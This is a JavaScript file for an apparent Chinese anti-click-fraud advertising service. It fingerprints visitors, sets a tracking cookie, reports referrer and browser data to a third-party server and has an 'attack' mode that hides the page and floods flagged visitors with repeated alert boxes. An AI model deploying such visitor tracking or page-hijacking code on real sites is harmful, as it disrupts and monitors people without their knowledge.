



function EbooomInfo() { }


//EbooomInfo.domain = "http://priventclicktest.medianet.cn";    /*     http://localhost:8873      */
EbooomInfo.domain = "http://360.kandao.com";




function EbooomSEM() {
    window.EbooomSEM ? alert("命名冲突") : window.EbooomSEM = {};
}


EbooomSEM.$ = function (id) {
    return document.getElementById(id);
};


EbooomSEM.ExplorerInfo = {};
var ua = navigator.userAgent.toLowerCase();
var s;
(s = ua.match(/msie ([\d.]+)/)) ? (EbooomSEM.ExplorerInfo.ie = s[1]) : ((s = ua.match(/firefox\/([\d.]+)/)) ? (EbooomSEM.ExplorerInfo.firefox = s[1]) : ((s = ua.match(/chrome\/([\d.]+)/)) ? (EbooomSEM.ExplorerInfo.chrome = s[1]) : ((s = ua.match(/opera.([\d.]+)/)) ? (EbooomSEM.ExplorerInfo.opera = s[1]) : ((s = ua.match(/version\/([\d.]+).*safari/)) ? (EbooomSEM.ExplorerInfo.safari = s[1]) : 0))));


EbooomSEM.ready = window.ready = function (fn) {
    if (document.addEventListener) {    // 非IE  
        document.addEventListener("DOMContentLoaded", function () {
            //注销事件，避免反复触发
            document.removeEventListener("DOMContentLoaded", arguments.callee, false);
            setTimeout(fn, 1);
        }, false);
    }
    else if (document.attachEvent) {    // IE
        document.attachEvent("onreadystatechange", function () {
            if (document.readyState === "complete") {
                document.detachEvent("onreadystatechange", arguments.callee);
                setTimeout(fn, 1);
            }
        });
    }
};


EbooomSEM.Guid = function (g) {
    var arr = new Array();    // 存放32位数值的数组
    if (typeof (g) == "string") {    // 如果构造函数的参数为字符串
        InitByString(arr, g);
    }
    else {
        InitByOther(arr);
    }
    // 返回一个值，该值指示 Guid 的两个实例是否表示同一个值。
    this.Equals = function (o) {
        if (o && o.IsGuid) {
            return this.ToString() == o.ToString();
        }
        else {
            return false;
        }
    };
    // Guid对象的标记
    this.IsGuid = function () { };
    // 返回 Guid 类的此实例值的 String 表示形式。
    this.ToString = function (format) {
        if (typeof (format) == "string") {
            if (format == "N" || format == "D" || format == "B" || format == "P") {
                return ToStringWithFormat(arr, format);
            }
            else {
                return ToStringWithFormat(arr, "D");
            }
        }
        else {
            return ToStringWithFormat(arr, "D");
        }
    };
    // 由字符串加载
    function InitByString(arr, g) {
        g = g.replace(/\{|\(|\)|\}|-/g, "");
        g = g.toLowerCase();
        if (g.length != 32 || g.search(/[^0-9,a-f]/i) != -1) {
            InitByOther(arr);
        }
        else {
            for (var i = 0; i < g.length; i++) {
                arr.push(g.charAt(i));
            }
        }
    }
    // 由其他类型加载
    function InitByOther(arr) {
        var i = 32;
        while (i--) {
            arr.push("0");
        }
    }
    /*
    根据所提供的格式说明符，返回此 Guid 实例值的 String 表示形式。
    N  32 位： xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
    D  由连字符分隔的 32 位数字 xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx
    B  括在大括号中、由连字符分隔的 32 位数字：{xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx}
    P  括在圆括号中、由连字符分隔的 32 位数字：(xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx)
    */
    function ToStringWithFormat(arr, format) {
        switch (format) {
            case "N":
                return arr.toString().replace(/,/g, "");
            case "D":
                var str = arr.slice(0, 8) + "-" + arr.slice(8, 12) + "-" + arr.slice(12, 16) + "-" + arr.slice(16, 20) + "-" + arr.slice(20, 32);
                str = str.replace(/,/g, "");
                return str;
            case "B":
                var str = ToStringWithFormat(arr, "D");
                str = "{" + str + "}";
                return str;
            case "P":
                var str = ToStringWithFormat(arr, "D");
                str = "(" + str + ")";
                return str;
            default:
                return new Guid();
        }
    }
};


// Guid 类的默认实例，其值保证均为零。
EbooomSEM.Guid.Empty = new EbooomSEM.Guid();


// 初始化 Guid 类的一个新实例。
EbooomSEM.Guid.NewGuid = function () {
    var g = "";
    var i = 32;
    while (i--) {
        g += Math.floor(Math.random() * 16.0).toString(16);
    }
    return new EbooomSEM.Guid(g);
};


//获取指定的querystring参数
EbooomSEM.getParam = function (paramName, url) {
    var paramValue = "";
    var isFound = false;
    if (url.indexOf("?") !== -1 && url.indexOf("=") > 1) {
        var end = url.indexOf("?");
        url = url.substring(end, url.length);
        var arrSource = unescape(url).substring(1, url.length).split("&");
        var i = 0;
        while (i < arrSource.length && !isFound) {
            if (arrSource[i].indexOf("=") > 0) {
                if (arrSource[i].split("=")[0].toLowerCase() == paramName.toLowerCase()) {
                    paramValue = arrSource[i].split("=")[1];
                    isFound = true;
                }
            }
            i++;
        }
    }
    return paramValue;
}


EbooomSEM.JSON = {};


var regJSON = function () {
    var cx = /[\u0000\u00ad\u0600-\u0604\u070f\u17b4\u17b5\u200c-\u200f\u2028-\u202f\u2060-\u206f\ufeff\ufff0-\uffff]/g,
            escapable = /[\\\"\x00-\x1f\x7f-\x9f\u00ad\u0600-\u0604\u070f\u17b4\u17b5\u200c-\u200f\u2028-\u202f\u2060-\u206f\ufeff\ufff0-\uffff]/g,
            gap,
            indent,
            meta = {
                '\b': '\\b',
                '\t': '\\t',
                '\n': '\\n',
                '\f': '\\f',
                '\r': '\\r',
                '"': '\\"',
                '\\': '\\\\'
            },
            rep;
    function quote(string) {
        escapable.lastIndex = 0;
        return escapable.test(string) ? '"' + string.replace(escapable, function (a) {
            var c = meta[a];
            return typeof c === 'string'
                    ? c
                    : '\\u' + ('0000' + a.charCodeAt(0).toString(16)).slice(-4);
        }) + '"' : '"' + string + '"';
    }
    function str(key, holder) {
        var i,
                k,
                v,
                length,
                mind = gap,
                partial,
                value = holder[key];
        if (value && typeof value === 'object' &&
                    typeof value.toJSON === 'function') {
            value = value.toJSON(key);
        }
        if (typeof rep === 'function') {
            value = rep.call(holder, key, value);
        }
        switch (typeof value) {
            case 'string':
                return quote(value);
            case 'number':
                return isFinite(value) ? String(value) : 'null';
            case 'boolean':
            case 'null':
                return String(value);
            case 'object':
                if (!value) {
                    return 'null';
                }
                gap += indent;
                partial = [];
                if (Object.prototype.toString.apply(value) === '[object Array]') {
                    length = value.length;
                    for (i = 0; i < length; i += 1) {
                        partial[i] = str(i, value) || 'null';
                    }
                    v = partial.length === 0
                        ? '[]'
                        : gap
                        ? '[\n' + gap + partial.join(',\n' + gap) + '\n' + mind + ']'
                        : '[' + partial.join(',') + ']';
                    gap = mind;
                    return v;
                }
                if (rep && typeof rep === 'object') {
                    length = rep.length;
                    for (i = 0; i < length; i += 1) {
                        if (typeof rep[i] === 'string') {
                            k = rep[i];
                            v = str(k, value);
                            if (v) {
                                partial.push(quote(k) + (gap ? ': ' : ':') + v);
                            }
                        }
                    }
                }
                else {
                    for (k in value) {
                        if (Object.prototype.hasOwnProperty.call(value, k)) {
                            v = str(k, value);
                            if (v) {
                                partial.push(quote(k) + (gap ? ': ' : ':') + v);
                            }
                        }
                    }
                }
                v = partial.length === 0
                    ? '{}'
                    : gap
                    ? '{\n' + gap + partial.join(',\n' + gap) + '\n' + mind + '}'
                    : '{' + partial.join(',') + '}';
                gap = mind;
                return v;
        }
    }
    if (typeof EbooomSEM.JSON.stringify !== 'function') {
        EbooomSEM.JSON.stringify = function (value, replacer, space) {
            var i;
            gap = '';
            indent = '';
            if (typeof space === 'number') {
                for (i = 0; i < space; i += 1) {
                    indent += ' ';
                }
            }
            else if (typeof space === 'string') {
                indent = space;
            }
            rep = replacer;
            if (replacer && typeof replacer !== 'function' &&
                        (typeof replacer !== 'object' ||
                        typeof replacer.length !== 'number')) {
                throw new Error('EbooomSEM.JSON.stringify');
            }
            return str('', { '': value });
        };
    }
};


regJSON();




 
  
 

EbooomSEM.AllowJP = true;
EbooomSEM.JsonP = function newsenddate(src) {
    var js_obj = document.createElement("script");
    js_obj.type = "text/javascript";
    js_obj.setAttribute("src", src);
    if (EbooomSEM.ExplorerInfo.ie !== "6.0" && document.body != null || EbooomSEM.ExplorerInfo.ie == "6.0" && document.readyState == "complete") {
        if (EbooomSEM.AllowJP) {
            document.body.appendChild(js_obj);
        }
        else {
            setTimeout(function () { document.body.appendChild(js_obj); }, 1000);
        }
    }
    else {
        EbooomSEM.AllowJP = false;
        EbooomSEM.ready(function () {
            document.body.appendChild(js_obj);
            EbooomSEM.AllowJP = true;
        });
    }
};







EbooomSEM.data = {};


// 执行
EbooomSEM.sem_go = function () {
    var cookie = {};
    var scriptArray = document.getElementsByTagName('script'), ss_domain = "http://s.coozone.cn/", ss_domain1 = "http://tj.shangdaotong.com/", semjs_path = "sem.js";

    var urlReg = /(http|https|ftp):\/\/[a-zA-Z0-9][-a-zA-Z0-9]{0,62}(\.[a-zA-Z0-9][-a-zA-Z0-9]{0,62})+\.?/;
    var url = "";
    try {
        url = urlReg.exec(document.referrer)[0];
    }
    catch (e) {
    }

    EbooomSEM.data.sid = "";
    EbooomSEM.data.r = url+"?";
    try {
        decodeURIComponent(EbooomSEM.data.r);
    }
    catch (ex) {
        if (EbooomSEM.data.r.indexOf('?') > 0) {
            EbooomSEM.data.r += "&";
        }
        else {
            EbooomSEM.data.r += "?";
        }
        EbooomSEM.data.r += "enigma=true";
    }
    EbooomSEM.data.h = window.location.host;
    EbooomSEM.data.ua = navigator.userAgent;
    EbooomSEM.data.current_url = window.location.href;
    EbooomSEM.data.qdid = "";
    var date = new Date();
    EbooomSEM.data.rat = [date.getFullYear(), '-', date.getMonth(), '-', date.getDay(), ' ', date.getHours(), ':', date.getMinutes(), ':', date.getSeconds(), '.' + date.getMilliseconds()].join('');
    EbooomSEM.data.semk = "";
    EbooomSEM.data.semc = "";
    EbooomSEM.data.wdsem = "";
    EbooomSEM.data.mbl = "";

    var sp = window.location.href.split('?');
    if (sp.length > 1) {
        var qsp = sp[1].split('&');
        for (var i = 0; i < qsp.length; i++) {
            var kvp = qsp[i].split('=');
            if (kvp[0] == 'semk') {
                EbooomSEM.data.semk = kvp[1];
            }
            else if (kvp[0] == 'cy') {
                EbooomSEM.data.semc = kvp[1];
            }
            else if (kvp[0] == 'wdsem') {
                EbooomSEM.data.wdsem = kvp[1];
            }
        }
    }

    cookie.set = function (n, v, t) {
        var exp = new Date();
        exp.setTime(exp.getTime() + (t || 24) * 60 * 60 * 1000);
        document.cookie = n + "=" + escape(v) + ";expires=" + exp.toGMTString() + ';domain=' + document.domain + ';path=/';
    };
    cookie.get = function (n) {
        var arr = document.cookie.match(new RegExp("(^| )" + n + "=([^;]*)(;|$)"));
        if (arr != null) return unescape(arr[2]);
        return null;
    };


    function getQueryString(name) {
        var reg = new RegExp("(^|&)" + name + "=([^&]*)(&|$)", "i");
        var r = window.location.search.substr(1).match(reg);
        if (r != null) {
            return unescape(r[2]);
        }
        return null;
    }

    if (cookie.get('MONITORID') == 'undefined' || cookie.get('MONITORID') == null) {
        EbooomSEM.data.ic = EbooomSEM.Guid.NewGuid().ToString("N");
        cookie.set('MONITORID', EbooomSEM.data.ic);
    }
    //    if (cookie.get('QDID') == 'undefined' || cookie.get('QDID') == 'null' || getQueryString('qdid') != null) {
    //        cookie.set('QDID', getQueryString('qdid'));
    //    }
    if (EbooomSEM.data.ic && EbooomSEM.data.ic.length == 32) {
        EbooomSEM.data.ic = EbooomSEM.data.ic.substr(0, 30);
    }
    else {
        EbooomSEM.data.ic = cookie.get('MONITORID').substr(0, 30);
    }

    //    if (cookie.get('QDID') == null) {
    //        EbooomSEM.data.qdid = '';
    //    }
    //    else {
    //        EbooomSEM.data.qdid = cookie.get('QDID');
    //    }


    for (var i = 0; i < scriptArray.length; i++) {
        var s = scriptArray[i].src, d = s.split('?');
        if (d[0] == ss_domain + semjs_path || ('http://' + d[0]) == ss_domain + semjs_path || d[0] == ss_domain1 + semjs_path || ('http://' + d[0]) == ss_domain1 + semjs_path) {
            var params = EbooomSEM.getParam('s', '?' + d[1]);
            if (params == '') {
                EbooomSEM.data.sid = '0';
            }
            else {
                EbooomSEM.data.sid = params;
            }
            break;
        }
    }

    var userAgent = window.navigator.userAgent;
    if (userAgent.indexOf('iPhone') > -1 || userAgent.indexOf('iPad') > -1 || userAgent.indexOf('Android') > -1)
        EbooomSEM.data.mbl = "1";
    else
        EbooomSEM.data.mbl = "0";

    EbooomSEM.JsonP(ss_domain + "/RequestHandler.ashx?jsonData=" + encodeURIComponent(EbooomSEM.JSON.stringify(EbooomSEM.data)));

};


EbooomSEM.sem_go();













function EbooomIntercepted() { }


//取关键词
EbooomIntercepted.GetKeyword = function () {
    var rf = document.referrer;
    rf = window.decodeURIComponent(rf);
    var patt1 = /\?([^&]*=[^&]*)/;
    var patthost = new RegExp("https?://[^/]*");
    if (rf != '' && patt1.test(rf)) {
        var patt2 = /\?.*/;
        if (patthost.exec(rf).toString().match("baidu") == "baidu") {
            return EbooomIntercepted.getParam("wd", patt2.exec(rf).toString());
        }
        if (patthost.exec(rf).toString().match("soso") == "soso") {
            return EbooomIntercepted.getParam("w", patt2.exec(rf).toString());
        }
        if (patthost.exec(rf).toString().match("sogou") == "sogou") {
            return EbooomIntercepted.getParam("query", patt2.exec(rf).toString());
        }
        if (patthost.exec(rf).toString().match("360") == "360") {
            return EbooomIntercepted.getParam("q", patt2.exec(rf).toString());
        }
        if (patthost.exec(rf).toString().match("youdao") == "youdao") {
            return EbooomIntercepted.getParam("q", patt2.exec(rf).toString());
        }
        if (patthost.exec(rf).toString().match("bing") == "bing") {
            return EbooomIntercepted.getParam("q", patt2.exec(rf).toString());
        }
        if (patthost.exec(rf).toString().match("yahoo") == "yahoo") {
            return EbooomIntercepted.getParam("p", patt2.exec(rf).toString());
        }
        if (patthost.exec(rf).toString().match("google") == "google") {
            return EbooomIntercepted.getParam("q", patt2.exec(rf).toString());
        }
    }
    else {
        return null;
    }
}

 


//获取指定的querystring参数
EbooomIntercepted.getParam = function (paramName, url) {
    var paramValue = "";
    var isFound = false;
    if (url.indexOf("?") !== -1 && url.indexOf("=") > 1) {
        var end = url.indexOf("?");
        url = url.substring(end, url.length);
        var arrSource = unescape(url).substring(1, url.length).split("&");
        var i = 0;
        while (i < arrSource.length && !isFound) {
            if (arrSource[i].indexOf("=") > 0) {
                if (arrSource[i].split("=")[0].toLowerCase() == paramName.toLowerCase()) {
                    paramValue = arrSource[i].split("=")[1];
                    isFound = true;
                }
            }
            i++;
        }
    }
    return paramValue;
}




EbooomIntercepted.semk = EbooomSEM.data.semk;
EbooomIntercepted.semc = EbooomSEM.data.semc;
EbooomIntercepted.cookie = EbooomSEM.data.ic;
EbooomIntercepted.keyword = EbooomIntercepted.GetKeyword();
EbooomIntercepted.siteid = EbooomSEM.data.sid;



// jsonp callback
EbooomIntercepted.exe2 = function (checkResoult) {
    // 判断是否可以拦截，拦截设置为拦截全部或带有semk or semc参数即付费点击

    var isPaymented = ((EbooomIntercepted.semk != "" || EbooomIntercepted.semc != "") && EbooomIntercepted.keyword != null);
    var allowIntercept = (checkResoult.IsPreventFree == 1 || isPaymented);

    if (checkResoult.InterceptedMode == 0) //每次都拦截
    {
        if (checkResoult.Settings != null) {
            // 如果是黑名单的，直接拦截，如果bu是黑名单，需要判断是否可以拦截，比如设置的只拦截付费点击，那么非付费的就不能拦截
            if (checkResoult.DInfo.indexOf("黑名单") > -1 || allowIntercept) {
                for (var i = 0; i < checkResoult.Settings.length; i++) {
                    if (checkResoult.Settings[i].Name == "发起攻击") {
                        EbooomDefense.Action(checkResoult.Settings[i].Mode, checkResoult.Settings[i].Content);
                        return;
                    }
                }
                for (var i = 0; i < checkResoult.Settings.length; i++) {
                    if (checkResoult.Settings[i].Name == "给予警告") {
                        EbooomDefense.Action(checkResoult.Settings[i].Mode, checkResoult.Settings[i].Content);
                        return;
                    }
                }
                for (var i = 0; i < checkResoult.Settings.length; i++) {
                    if (checkResoult.Settings[i].Name == "善意提醒") {
                        EbooomDefense.Action(checkResoult.Settings[i].Mode, checkResoult.Settings[i].Content);
                        return;
                    }
                }
            }
        }
    }
    else if (checkResoult.InterceptedMode == 1)    // 根据拦截信息字段true false拦截
    {
        for (var i = 0; i < checkResoult.Settings.length; i++) {
            if (checkResoult.Settings[i].Name == "发起攻击" && checkResoult.Settings[i].IsIntercepted) {
//                alert("发起攻击 click=" + checkResoult.Settings[i].Click + " mode=" + checkResoult.Settings[i].Mode + " content=" + checkResoult.Settings[i].Content); return;
                EbooomDefense.Action(checkResoult.Settings[i].Mode, checkResoult.Settings[i].Content);
                return;
            }
        }
        for (var i = 0; i < checkResoult.Settings.length; i++) {
            if (checkResoult.Settings[i].Name == "给予警告" && checkResoult.Settings[i].IsIntercepted) {
//                alert("给予警告 click=" + checkResoult.Settings[i].Click + " mode=" + checkResoult.Settings[i].Mode + " content=" + checkResoult.Settings[i].Content); return;
                EbooomDefense.Action(checkResoult.Settings[i].Mode, checkResoult.Settings[i].Content);
                return;
            }
        }
        for (var i = 0; i < checkResoult.Settings.length; i++) {
            if (checkResoult.Settings[i].Name == "善意提醒" && checkResoult.Settings[i].IsIntercepted) {
//                alert("善意提醒 click=" + checkResoult.Settings[i].Click + " mode=" + checkResoult.Settings[i].Mode + " content=" + checkResoult.Settings[i].Content); return;
                EbooomDefense.Action(checkResoult.Settings[i].Mode, checkResoult.Settings[i].Content);
                return;
            }
        }
    }
    else {
       // 不拦截
    }
}

























// 拦截效果 start ----------------------------------------------------------------------------------------------------------------------------------------------

function EbooomDefense() {
    window.EbooomDefense ? document.location.href = 'about:blank' : window.EbooomDefense = {};
}
EbooomDefense.$ = function (id) {
    return document.getElementById(id);
};
EbooomDefense.ready = window.ready = function (fn) {
    if (document.addEventListener) {
        document.addEventListener("DOMContentLoaded", function () {
            document.removeEventListener("DOMContentLoaded", arguments.callee, false);
            setTimeout(fn, 2);
        }, false);
    }
    else if (document.attachEvent) {
        document.attachEvent("onreadystatechange", function () {
            if (document.readyState === "complete") {
                document.detachEvent("onreadystatechange", arguments.callee);
                setTimeout(fn, 2);
            }
        });
    }
};
EbooomDefense.GetReferrer = function () {
    var referrer = "";
    try {
        referrer = window.top.document.referrer;
    }
    catch (e) {
        if (window.parent) {
            try {
                referrer = window.parent.document.referrer;
            }
            catch (e2) {
                referrer = "";
            }
        }
    }
    if (referrer === "") {
        referrer = document.referrer;
    }
    return referrer;
};
EbooomDefense.ExplorerInfo = {};
var ua = navigator.userAgent.toLowerCase();
var s;
(s = ua.match(/msie ([\d.]+)/)) ? (EbooomDefense.ExplorerInfo.ie = s[1]) : ((s = ua.match(/firefox\/([\d.]+)/)) ? (EbooomDefense.ExplorerInfo.firefox = s[1]) : ((s = ua.match(/chrome\/([\d.]+)/)) ? (EbooomDefense.ExplorerInfo.chrome = s[1]) : ((s = ua.match(/opera.([\d.]+)/)) ? (EbooomDefense.ExplorerInfo.opera = s[1]) : ((s = ua.match(/version\/([\d.]+).*safari/)) ? (EbooomDefense.ExplorerInfo.safari = s[1]) : 0))));

if (!!(navigator.userAgent.match(/Trident/) && navigator.userAgent.match(/rv.*11/))) {
    EbooomDefense.ExplorerInfo.ie = "11";
}

EbooomDefense.Pos = function () {
    var x6 = Math.max(EbooomDefense.Doc.body.scrollLeft, EbooomDefense.DocElement.scrollLeft) + EbooomDefense.DocElement.clientWidth / 2,
    			y6 = Math.max(EbooomDefense.Doc.body.scrollTop, EbooomDefense.DocElement.scrollTop) + EbooomDefense.DocElement.clientHeight / 2,
    			w = Math.max(EbooomDefense.DocElement.scrollWidth, EbooomDefense.Doc.body.scrollWidth, EbooomDefense.DocElement.clientWidth),
    			h = Math.max(EbooomDefense.DocElement.scrollHeight, EbooomDefense.Doc.body.scrollHeight, EbooomDefense.DocElement.clientHeight),
    			x = EbooomDefense.DocElement.clientWidth / 2,
    			y = EbooomDefense.DocElement.clientHeight / 2;
    if (EbooomDefense.ExplorerInfo.ie) {
        w = EbooomDefense.Doc.body.clientWidth;
        h = EbooomDefense.Doc.body.clientHeight;
    }
    return ((!!EbooomDefense.ExplorerInfo.ie) && EbooomDefense.ExplorerInfo.ie == "6.0") ? {
        x: x6,
        y: y6,
        w: w,
        h: h
    } : {
        x: x,
        y: y,
        w: w,
        h: h
    }
};
EbooomDefense.getScrollTop = function () {
    var scrollTop = 0;
    if (document.documentElement && document.documentElement.scrollTop) {
        scrollTop = document.documentElement.scrollTop;
    }
    else if (document.body) {
        scrollTop = document.body.scrollTop;
    }
    return scrollTop;
};
// 取窗口可视范围的高度
EbooomDefense.getClientHeight = function () {
    var clientHeight = 0;
    if (document.body.clientHeight && document.documentElement.clientHeight) {
        var clientHeight = (document.body.clientHeight < document.documentElement.clientHeight) ? document.body.clientHeight : document.documentElement.clientHeight;
    }
    else {
        var clientHeight = (document.body.clientHeight > document.documentElement.clientHeight) ? document.body.clientHeight : document.documentElement.clientHeight;
    }
    return clientHeight;
};
// 取文档内容实际高度
EbooomDefense.getScrollHeight = function () {
    return Math.max(document.body.scrollHeight, document.documentElement.scrollHeight);
};


EbooomDefense.addEvent = function (obj, evt, fn) {
    if (!obj) {
        return false;
    }
    if (obj.addEventListener) {
        obj.addEventListener(evt, fn, false);
        return obj;
    }
    else {
        if (!obj.functions) {
            obj.functions = {};
        }
        if (!obj.functions[evt]) {
            obj.functions[evt] = [];
        }
        var functions = obj.functions[evt];
        for (var i = 0; i < functions.length; i++) {
            if (functions[i] === fn) {
                return obj;
            }
        }
        functions.push(fn);
        if (typeof obj["on" + evt] == "function") {
            if (obj["on" + evt] != EbooomDefense.handler) {
                functions.push(obj["on" + evt]);
            }
        }
        obj["on" + evt] = EbooomDefense.handler;
        return obj;
    }
};
EbooomDefense.handler = function (evt) {
    var evt = evt || window.event;
    var evtype = evt.type;
    var functions = this.functions[evtype];
    for (var i = 0; i < functions.length; i++) {
        if (functions[i]) functions[i].call(this, evt);
    }
};
EbooomDefense.Mask = function () {
    EbooomDefense.Doc.body.style.overflow = "hidden";
    var maskLayer = EbooomDefense.Doc.createElement("div");
    maskLayer.id = "EbooomDefense_mask_id";
    maskLayer.className = "ebooom_defense";
    var pos = EbooomDefense.Pos(), w = pos.w, h = pos.h, mw = "width:" + w + "px;", mh = "height:" + h + "px;", display = "display: block; margin: 0; padding: 0; opacity: 0.6; filter: alpha(opacity = 60); background: #000;position:absolute;top:0;left:0;border:none;z-index:99997;overflow:hidden;";
    maskLayer.style.cssText = mw + mh + display;
    EbooomDefense.Doc.body.appendChild(maskLayer);
    EbooomDefense.addEvent(window, "resize", function (e) {
        var p = EbooomDefense.Pos(), rw = p.w, rh = p.h, mw = "width:" + rw + "px;", mh = "height:" + rh + "px;", display = "display: block; margin: 0; padding: 0; opacity: 0.6; filter: alpha(opacity = 60); background: #000;position:absolute;top:0;left:0;border:none;z-index:99997;overflow:hidden;";
        maskLayer.style.cssText = mw + mh + display;
    });
};
EbooomDefense.UnMask = function () {
    EbooomDefense.Doc.body.style.overflow = "visible";
    EbooomDefense.Doc.body.removeChild(EbooomDefense.$("EbooomDefense_mask_id"));
};
EbooomDefense.SImage = function (callback) {
    var img = new Image();
    img.className = "ebooom_defense";
    img.style.position = "absolute";
    img.style.zIndex = 9999999;
    //    img.cssText = "position:absolute;z-index:99999;";
    this.img = img;
    var sto = setTimeout(function () {
        callback(img);
    }, 3000);
    if (EbooomDefense.ExplorerInfo.ie) {      // ie
        img.onreadystatechange = function () {
            if (img.readyState == "complete") {
                clearTimeout(sto);
                callback(img);
            }
        };
    }
    else {
        EbooomDefense.addEvent(img, 'load', function () {
            if (img.complete == true) {
                clearTimeout(sto);
                callback(img);
            }
        });
    }
};
EbooomDefense.SImage.prototype.get = function (url) {
    this.img.src = url;
};
EbooomDefense.Alert = function (tit, msg, obj, unmask) {
    window.scrollTo(0, 0);
    EbooomDefense.Doc.body.style.overflow = "hidden";
    var alert_box = EbooomDefense.Doc.createElement("div");
    alert_box.style.width = "417px";
    alert_box.style.height = "180px";
    alert_box.style.position = "absolute";
    alert_box.style.zIndex = 9999999;
    alert_box.style.backgroundImage = "url(" + EbooomInfo.domain + "/Content/images/Alert.gif)";
    var div_clost = EbooomDefense.Doc.createElement("div");
    div_clost.style.width = "30px";
    div_clost.style.height = "30px";
    div_clost.style.position = "absolute";
    div_clost.style.right = "0px";
    div_clost.style.top = "0px";
    div_clost.style.cursor = "pointer";
    EbooomDefense.addEvent(div_clost, "click", function () { EbooomDefense.Doc.body.removeChild(alert_box); obj.flag = false; if (unmask) { EbooomDefense.UnMask(); } });
    alert_box.appendChild(div_clost);
    var div_confirm = EbooomDefense.Doc.createElement("div");
    div_confirm.style.width = "80px";
    div_confirm.style.height = "24px";
    div_confirm.style.position = "absolute";
    div_confirm.style.left = "168px";
    div_confirm.style.top = "105px";
    div_confirm.style.cursor = "pointer";
    EbooomDefense.addEvent(div_confirm, "click", function () { EbooomDefense.Doc.body.removeChild(alert_box); obj.flag = false; if (unmask) { EbooomDefense.UnMask(); } });
    alert_box.appendChild(div_confirm);
    var title = EbooomDefense.Doc.createElement("div");
    title.style.width = "200px";
    title.style.height = "24px";
    title.style.position = "absolute";
    title.style.left = "10px";
    title.style.top = "7px";
    title.style.color = "#FFF";
    title.style.fontSize = "12px";
    title.style.fontWeight = "bold";
    title.style.cursor = "default";
    title.innerHTML = tit;
    alert_box.appendChild(title);
    var content = EbooomDefense.Doc.createElement("div");
    content.style.width = "300px";
    content.style.height = "50px";
    content.style.position = "absolute";
    content.style.left = "66px";
    content.style.top = "48px";
    content.style.color = "#000";
    content.style.fontSize = "12px";
    content.style.lineHeight = "24px";
    content.style.cursor = "default";
    content.innerHTML = msg;
    alert_box.appendChild(content);
    var pos = EbooomDefense.Pos(), w = pos.w, h = EbooomDefense.getClientHeight();
    var t = (h / 2 - 180 / 2), l = (w / 2 - 417 / 2);
    alert_box.style.top = t + "px";
    alert_box.style.left = l + "px";
    EbooomDefense.addEvent(window, "resize", function (e) {
        var p = EbooomDefense.Pos(), rw = p.x, rh = EbooomDefense.getClientHeight();
        var tt = EbooomDefense.getClientHeight() / 2 - 180 / 2, ll = ((p.x == 0 ? (p.w / 2) : p.x) - 417 / 2);
        alert_box.style.top = (tt + EbooomDefense.getScrollTop()) + "px";
        alert_box.style.left = ll + "px";
    });
    EbooomDefense.addEvent(window, "scroll", function (e) {
        var p = EbooomDefense.Pos(), rw = p.x, rh = EbooomDefense.getClientHeight();
        var tt = EbooomDefense.getClientHeight() / 2 - 180 / 2, ll = ((p.x == 0 ? (p.w / 2) : p.x) - 417 / 2);
        alert_box.style.top = (tt + EbooomDefense.getScrollTop()) + "px";
        alert_box.style.left = ll + "px";
    });
    EbooomDefense.Doc.body.appendChild(alert_box);
};
EbooomDefense.Alerts = function (tit, msg, count, unMask, delay) {
    EbooomDefense.Mask();
    var obj = { flag: false };
    var i = 0;
    if (!delay) {
        delay = 200;
    }
    var sit = setInterval(function () {
        if (!obj.flag) {
            obj.flag = true;
            if (++i > count) {
                clearInterval(sit);
            }
            else {
                if (i == count && unMask) {
                    setTimeout(function () { EbooomDefense.Alert(tit, msg, obj, true); }, delay);
                }
                else {
                    setTimeout(function () { EbooomDefense.Alert(tit, msg, obj); }, delay);
                }
            }
        }
    }, 50);
};


EbooomDefense.AlertHtml = function (text) {
    window.scrollTo(0, 0);
    EbooomDefense.Doc.body.style.overflow = "hidden";
    var all_element = EbooomDefense.Doc.body.getElementsByTagName("*");
    for (var i = 0; i < all_element.length; i++) {
        if (all_element[i].className.indexOf("ebooom_defense") == -1) {
            //                all_element[i].style.display = "none";
            try {
                all_element[i].style.visibility = "hidden";
            }
            catch (ex) { }
        }
    }
    var main_div = EbooomDefense.Doc.createElement("div");
    var pos = EbooomDefense.Pos(), w = pos.w, h = EbooomDefense.getClientHeight();
    main_div.style.width = "100%";
    main_div.style.height = h + "px";
    main_div.style.position = "absolute";
    main_div.style.left = "0px";
    main_div.style.top = "0px";
    main_div.style.zIndex = 9999999;
    main_div.style.backgroundColor = "#000";
    var inner_div = EbooomDefense.Doc.createElement("div");
    inner_div.style.width = "auto";
    inner_div.style.height = "auto";
    inner_div.style.margin = "50px 50px 0 50px";
    inner_div.innerHTML = "<div style=\"color:#fe0000;line-height:52px;font-size:36px;font-weight:bold\">尊敬的客户，您好：<br/>" + text + "</div><div style=\"margin-top:50px;color:#00a2e4;line-height:18px;font-size:27px;font-weight:bold\">防恶意点击系统采用SEM精算师监控系统（官网：http://www.shangdaotong.com）</div>";
    main_div.appendChild(inner_div);
    EbooomDefense.addEvent(window, "resize", function (e) {
        main_div.style.height = (EbooomDefense.getScrollTop() + EbooomDefense.getClientHeight()) + "px";
    });
    EbooomDefense.addEvent(window, "scroll", function (e) {
        main_div.style.height = (EbooomDefense.getScrollTop() + EbooomDefense.getClientHeight()) + "px";
    });
    EbooomDefense.Doc.body.appendChild(main_div);
};


//// CssRule类由StyleSheet.getRule方法返回，不直接创建
//EbooomDefense.CssRule = function (rule) {
//    this.rule = rule;
//    this.style = rule.style;
//    this.selectorText = rule.selectorText;
//    this.index = null;
//};
//EbooomDefense.StyleSheet = function () {
//    var head = document.getElementsByTagName("head")[0];
//    //通过新建标签来创建新样式
//    /*
//    在此不用document.createStyleSheet来完成，是因为在FF下
//    如果未导入任何CSS文件的情况下document.createStyleSheet方法失败
//    */
//    var style = document.createElement("style");
//    style.type = "text/css";
//    head.appendChild(style);
//    this.CatchStyle(document.styleSheets.length - 1);
//};
//EbooomDefense.StyleSheet.prototype = {
//    //可直接捕获现有Style
//    CatchStyle: function (index) {
//        this.style = document.styleSheets[index];
//        if (!EbooomDefense.ExplorerInfo.ie) { //非IE浏览器补丁
//            this.style.addRule = function (selector, style) {
//                var index = this.cssRules.length;
//                this.insertRule(selector + "{" + style + "}", index);
//            };
//            this.style.removeRule = function (index) {
//                this.deleteRule(index);
//            };
//        }
//    },
//    //新增样式
//    AddRule: function (selector, style) {
//        this.style.addRule(selector, style);
//    },
//    //删除样式
